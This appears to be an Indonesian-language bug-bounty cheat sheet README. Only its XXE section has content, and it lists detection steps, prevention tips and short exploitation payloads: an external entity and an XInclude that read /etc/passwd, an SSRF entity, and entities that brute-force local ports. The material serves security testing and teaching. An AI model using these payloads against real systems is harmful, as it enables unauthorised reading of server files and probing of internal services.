# VULNERABILITY :bug:

<p align="center"><img src="https://user-images.githubusercontent.com/52058660/89898222-85c0a500-dc0a-11ea-9eca-815238a55a38.jpg" width="500"></p>

Online resource:
- [bugbounty-cheatsheet](https://github.com/EdOverflow/bugbounty-cheatsheet) - by EdOverflow
---

## XXE
Sebelum memahami XXE, kita harus memiliki pengetahuan dasar XML, DTD dan entity. Tools yang digunakan adalah Burpsuite, lebih mantap lagi jika menggunakan Burp Collaborator (*berbayar*).
- **Detection**
  - [Cari](https://christian-schneider.net/GenericXxeDetection.html) aplikasi yang mengirimkan data dalam format XML, disebut juga XML endpoint
  - Intercept web page, lalu cari web yang request header `Content-Type`-nya `text/xml` atau `application/xml`
  - Cari fitur web yang mengunakan XML, seperti RSS, SOAP
  - Cara cepat menemukan XML endpoint adalah automasi
  
- **Exploitation**
  - Retrieve Files. Inject [payload](https://github.com/payloadbox/xxe-injection-payload-list) ke bagian `!DOCTYPE`
    > `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM “file:///etc/passwd”> ]>`
  - Exploiting to perform Server Side Request Forgery (SSRF). Sama seperti cara di atas. Tapi jika sebelumnya menggunakan `file`, untuk exploitasi ini menggunakan `http` dilanjutkan dengan ip server
    > `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM “http://1”> ]>`
  - Jika tidak bisa modifikasi `!DOCTYPE`, gunakan `XInclude` (baca SOAP dan XML namespace)
    > `<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>`
  - Test local machine port (gunakan burp intruder). Brute port dari ip local, lalu cek bergantian `http` dan `https`
    > `<!DOCTYPE xxe SYSTEM "http://127.0.0.1:§port§/">`
    > `<!DOCTYPE xxe SYSTEM "https://127.0.0.1:§port§/">`
  - Exploiting [RSS validator](https://taind.wordpress.com/2017/12/25/root-me-xml-external-entity/). Store XML payload ke server, jika tidak punya gunakan [filebin](https://filebin.net/)
    
- **Prevention**
  - Disable DTD
  - Disable entity saja
---
## Subdomain Takeover

---
## SQL Injection

---
## XSS

